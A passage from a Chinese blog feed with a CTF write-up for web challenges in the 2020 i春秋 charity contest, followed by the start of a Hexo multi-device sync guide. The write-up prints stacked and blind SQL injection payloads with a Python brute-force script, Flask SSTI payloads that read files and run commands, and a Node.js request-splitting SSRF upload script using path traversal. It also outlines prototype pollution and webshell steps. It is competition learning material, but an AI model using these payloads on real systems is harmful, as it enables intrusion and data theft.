href="#2-2-blacklist" class="headerlink" title="2.2 blacklist"></a>2.2 blacklist</h4><p>需要先利用堆叠注入查询表和字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></figure><p>得到FlagHere表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;FlagHere&#96;;#</span><br></pre></td></tr></table></figure><p>得到flag字段</p><p>根据一叶飘零大佬的blog：<a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</a> 构造exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;; handler &#96;FlagHere&#96; open as &#96;tgt&#96;;handler &#96;tgt&#96; read next;--</span><br></pre></td></tr></table></figure><h4 id="2-3-Ezsqli"><a href="#2-3-Ezsqli" class="headerlink" title="2.3 Ezsqli"></a>2.3 Ezsqli</h4><ul><li>无in注表名 </li></ul><p>参考：聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p><ul><li>无union select和字段名注数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(2|(MID((select (select 1,1) &#x3D; (select * from f1ag_1s_h3r3_hhhhh limit 0,1)),1,1)&#x3D;0))</span><br><span class="line">列的数量有两个</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select count(*) from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">共有一条记录</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select id from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">记录有一个字段为id&#x3D;1</span><br></pre></td></tr></table></figure><p>参考这个：<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3830.html</a></p><p>使用 <code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code> 来另其返回二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0365e3e590804cff9ae00511314e9994c04ae9b25b574cac.changame.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    str1 &#x3D; (&#39;0123456789&#39;+string.ascii_letters+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br><span class="line">    for j in range(1,40):</span><br><span class="line">        for i in str1:</span><br><span class="line">            paylaod &#x3D; &quot;1&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;(select substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#39;&#123;&#125;&#39;&quot;.format(select, j, i)</span><br><span class="line">            #print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">            if &#39;Nu1L&#39; in r.text:</span><br><span class="line">                flag +&#x3D; i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def exp2():</span><br><span class="line">    str1 &#x3D; (&#39;-0123456789&#39;+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    flag_table_name &#x3D; &#39;f1ag_1s_h3r3_hhhhh&#39;</span><br><span class="line">    for j in range(1,39):</span><br><span class="line">        for i in str1:</span><br><span class="line">            i &#x3D; flag+i</span><br><span class="line">            paylaod &#x3D; &quot;1&amp;&amp;((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;.format(i,flag_table_name)</span><br><span class="line">            print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">            if &#39;Nu1L&#39; not in r.text:</span><br><span class="line">                flag&#x3D;i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="3-1-Flaskapp"><a href="#3-1-Flaskapp" class="headerlink" title="3.1 Flaskapp"></a>3.1 Flaskapp</h4><p>ssti+pin码的安全机制</p><p>payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line">或者</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;想要读取的文件&#39;).read()&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">反弹shell</span><br></pre></td></tr></table></figure><p>最后的读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&quot;ls -al &#x2F;&quot;).read())</span><br><span class="line">print(os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read())</span><br></pre></td></tr></table></figure><h4 id="3-2-easy-thinking"><a href="#3-2-easy-thinking" class="headerlink" title="3.2 easy_thinking"></a>3.2 easy_thinking</h4><p>预期解法：</p><p>先注册一个账号，然后在登录时候burp抓包，修改session，注意长度必须是32位，将session改成<code>.php</code>结尾</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225223441544.png" alt></p><p>搜索框输入一句话木马，然后访问</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225224532369.png" alt></p><p>剩下就是绕过，参考 <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p><p>参考资料：</p><blockquote><p><a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/</a></p><p><a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><h3 id="3-3-Node-Game"><a href="#3-3-Node-Game" class="headerlink" title="3.3 Node Game"></a>3.3 Node Game</h3><p>太菜了，比赛的时候做不出来，赛后进行复盘学习QAQ</p><ol><li>题目给了源代码，首先进行代码审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.post(&#39;&#x2F;file_upload&#39;, function(req, res)&#123;</span><br><span class="line">    var ip &#x3D; req.connection.remoteAddress;</span><br><span class="line">    var obj &#x3D; &#123;</span><br><span class="line">        msg: &#39;&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;</span><br><span class="line">        obj.msg&#x3D;&quot;only admin&#39;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data)&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;</span><br><span class="line">            var file_name &#x3D; req.files[0].originalname</span><br><span class="line">            var dir_file &#x3D; __dirname + file_path + file_name</span><br><span class="line">            if(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg &#x3D; &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj &#x3D; &#123;</span><br><span class="line">                    msg: &#39;upload success&#39;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>文件上传功能会首先判断IP是否来自127.0.0.1，这里就需要构造SSRF，然后是保存文件，是根据传过去的 MIME 类型和文件名生成路径的，这里控制文件类型进行目录穿越进行任意文件上传。</p><p>core路由接收q 参数然后拼接在 /source? 后面进行访问，然后会把访问结果显示出来，这里可以进行ssrf访问，但是存在过滤。nodejs版本提示是8.12.0，存在[request splitting](<a href="http://projects.webappsec.org/w/page/13246929/HTTP" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246929/HTTP</a> Request Splitting)漏洞，攻击原理可以参考这个 <a href="https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符</a>, 只保留低位的字符, 也就是说假如我们传入<code>chr(0xffa0)</code>处理后会被截断为<code>chr(0xa0)</code>，并且这个<code>0xff</code>可更换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;core&#39;, function(req, res) &#123;</span><br><span class="line">    var q &#x3D; req.query.q;</span><br><span class="line">    var resp &#x3D; &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger &#x3D; blacklist(url);</span><br><span class="line">        if (trigger &#x3D;&#x3D;&#x3D; true) &#123;</span><br><span class="line">            res.send(&quot;&lt;p&gt;error occurs!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#39;utf8&#39;);</span><br><span class="line">                    resp.on(&#39;error&#39;, function(err) &#123;</span><br><span class="line">                    if (err.code &#x3D;&#x3D;&#x3D; &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                     console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                     return;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(&#39;data&#39;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                         resps &#x3D; chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;catch (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(&#39;error&#39;, (e) &#x3D;&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#39;q&#39; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>首页有一块部分接受action参数，并拼接到 template 下的目录用 pug 引擎渲染</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    var action &#x3D; req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;);</span><br><span class="line">    var html &#x3D; pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用pug文档中的包含include可以尝试读取根目录flag  参考：<a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank" rel="noopener">包含 Include</a></p><ol start="3"><li>参考赵师傅的脚本发包：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------1403693673106942081532243149</span><br><span class="line">Connection: keep-alive</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Host: x</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149--</span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">print(payload)</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;707e299e-f951-4d9b-ac8a-bc2c3de5a2b8.node3.buuoj.cn&#x2F;core?q&#x3D;&#39; + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>最后访问/?action=test得到flag</p><p>参考资料：</p><blockquote><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><p><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2</a></p><p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a></p></blockquote><h4 id="3-4-EzExpress"><a href="#3-4-EzExpress" class="headerlink" title="3.4 EzExpress"></a>3.4 EzExpress</h4><p>赛后复盘写的，学习了一下JavaScript原型链污染</p><ol><li>提示<a href="http://www.zip源代码，访问下载进行审计" target="_blank" rel="noopener">www.zip源代码，访问下载进行审计</a></li></ol><p>对routes 下路由文件进行审计，开头出现merge 和 clone，存在原型链污染漏洞</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213223562.png" alt></p><p>在action路由发现只有用户为admin才能触发原型链污染</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213453879.png" alt></p><p>但是注册的时候不能带有admin</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213721947.png" alt></p><ol start="2"><li><p>参考这篇文章，<a href="https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n</a></p></li><li><p>访问action抓包，构造恶意请求,注意要设置<code>Content-Type: application/json</code></p></li></ol><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318214151607.png" alt></p><ol start="4"><li>访问<code>/info</code>触发原型链，访问<code>/flag</code>下载即可</li></ol><p>参考资料：</p><blockquote><p><a href="https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gyctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 实现多终端同步</title>
      <link href="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/"/>
      <url>/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前习惯使用学校机房写笔记，又不舍得放下自己电脑的笔记，查阅了网上资料后，就有了这一篇文章</p><p>博客主题采用了修改版本cactus主题：<a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank" rel="noopener">https://github.com/xuthus5/hexo-theme-cactus</a></p><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>hexo项目的目录结构如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HEXO</span><br><span class="line">├──.deploy_git/</span><br><span class="line">├──node_modules/</span><br><span class="line">├──public/</span><br><span class="line">├──scaffolds/</span><br><span class="line">├──<span class="built_in">source</span>/</span><br><span class="line">├──themes/</span><br><span class="line">├──_config.yml</span><br><span class="line">├──.gitignore</span><br><span class="line">├──db.json</span><br><span class="line">├──debug.log</span><br><span class="line">└──package.json</span><br></pre></td></tr></table></figure><blockquote><p>其中.deploy_git、public两个文件夹下存放的是博客文章的静态页面，通过对比github上博客仓库的master分支可以看到master分支下面的文件结构和.deploy_git文件夹下的文件是一致的，这个应该可以判断通过hexo g -d发布到github的内容就是.deploy_git文件夹下面的文件。其余的文件夹和文件即是Hexo的主题文件、原始的博客文件等，刚在上文提到的hexo分支，存的即时这些文件。</p></blockquote><h3 id="方案原理分析"><a href="#方案原理分析" class="headerlink" title="方案原理分析"></a>方案原理分析</h3><blockquote><p>方案主要是通过维护两条git分支来实现，第一个分支是gihub上默认的master分支，用于存放发布的博文的静态页面；另外再新建一个分支，比如命名为hexo，通过此分支存放主题、原始的博客文件等等，这些文件才是不同电脑需要同步的文件；当每次修改主题或者新增博文后，先将修改的主题文件（在themes文件夹下）或者新增博客（在source文件夹下），同步到远程的hexo分支，然后在通过hexo g -d命令发布博文，也就是将新增的博文的静态页面同步到master分支。这样通过不同的分支管理不同的文件，实现了多台电脑同步更新博文的功能。</p></blockquote><p>技术方案如下：</p><p><img src="/2020/03/18/Hexo-%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5/1.png" alt></p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li><p>创建分支（在github上操作）</p><p><strong>在Github远程创建 hexo branch</strong>，并将新的<strong>hexo</strong> branch <strong>设置成 Default branch</strong>，替代原本的默认分支: master branch</p></li><li><p>初始化分支（PC1上面操作）</p><ul><li>github上切换到hexo分支，<code>git clone</code>仓库到本地。</li><li>此时本地会多出一个<code>username.github.io</code>文件夹，命令行<code>cd</code>进去，删除除<code>.git</code>文件夹（如果你看不到这个文件夹，说明是隐藏了。4</li><li>命令行<code>git add -A</code>把工作区的变化（包括已删除的文件）提交到暂存区（ps:<code>git add .</code>提交的变化不包括已删除的文件）。</li><li>命令行<code>git commint -m &quot;some description&quot;</code>提交。</li><li>命令行<code>git push origin hexo</code>推送到远程hexo分支。此时刷下github，如果正常操作，hexo分支应该已经被清空了。</li><li>复制本地<code>username.github.io</code>文件夹中的<code>.git</code>文件夹到hexo项目根目录下。此时，hexo项目已经变成了和远程hexo分支关联的本地仓库了。而<code>username.github.io</code>文件夹的使命到此为止，你可以把它删掉，因为我们只是把它作为一个“中转站”的角色。以后每次发布新文章或修改网站样式文件时，<code>git add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>即可把环境文件推送到hexo分支。然后再<code>hexo g 